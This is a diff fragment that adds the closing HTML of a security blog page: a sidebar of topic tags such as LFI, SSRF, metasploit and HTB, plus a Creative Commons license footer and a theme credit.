+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
